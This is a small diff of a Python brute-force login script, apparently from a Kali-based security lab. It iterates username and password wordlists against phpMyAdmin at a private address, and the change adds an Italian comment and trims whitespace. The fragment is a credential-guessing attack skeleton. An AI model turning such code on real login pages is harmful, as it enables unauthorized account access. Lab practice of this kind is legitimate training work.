@@ -4,9 +4,9 @@ username_file_path = '/home/kali/Desktop/usernames.lst'
 password_file_path = '/home/kali/Desktop/passwords.lst'
 
 with open(username_file_path, 'r') as usernames, open(password_file_path, 'r') as passwords:
+#iterazioni di nome utente e password inseriti nel payload per il tentativo di login 
     for username in usernames:
-        username = username.rstrip()
-            
+        username = username.rstrip()     
         for password in passwords:
             password = password.rstrip()
             url = "http://192.168.32.101/phpMyAdmin/"
